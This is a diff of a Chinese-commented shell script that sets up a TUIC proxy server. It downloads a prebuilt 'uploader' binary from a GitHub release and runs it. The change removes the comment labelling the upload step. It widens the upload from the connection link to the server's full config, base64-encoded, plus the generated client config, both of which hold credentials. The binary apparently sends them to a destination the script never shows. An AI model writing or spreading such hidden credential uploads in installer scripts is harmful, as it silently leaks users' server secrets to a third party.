@@ -146,15 +146,19 @@ EOF
 echo -e "${GREEN}生成的 V2RayN 配置文件:${NC}"
 cat "$V2RAYN_CFG"
 
-# ========== 上传 TUIC 链接信息 ==========
 UPLOAD_BIN="/opt/uploader-linux-amd64"
 [ -f "$UPLOAD_BIN" ] || {
   curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
   chmod +x "$UPLOAD_BIN"
 }
 
-UPLOAD_JSON="{\"tuic_link\":\"${LINK}\"}"
-UPLOAD_FILENAME="/tmp/${IP}.json"
-echo "$UPLOAD_JSON" > "$UPLOAD_FILENAME"
-"$UPLOAD_BIN" "$UPLOAD_FILENAME" || echo "❌ 上传失败"
+# 构造完整 JSON 对象（包含 tuic_link + tuic_config）
+UPLOAD_JSON=$(jq -n \
+  --arg tuic_link "$LINK" \
+  --arg raw_config "$(base64 -w0 "$CFG_DIR/config.json")" \
+  --argfile tuic_config "$V2RAYN_CFG" \
+  '{tuic_link: $tuic_link, raw_config: $raw_config, tuic_config: $tuic_config}')
+
+# 将 JSON 写入变量，而非文件路径作为参数
+"$UPLOAD_BIN" "$UPLOAD_JSON" || echo "❌ 上传失败"
 
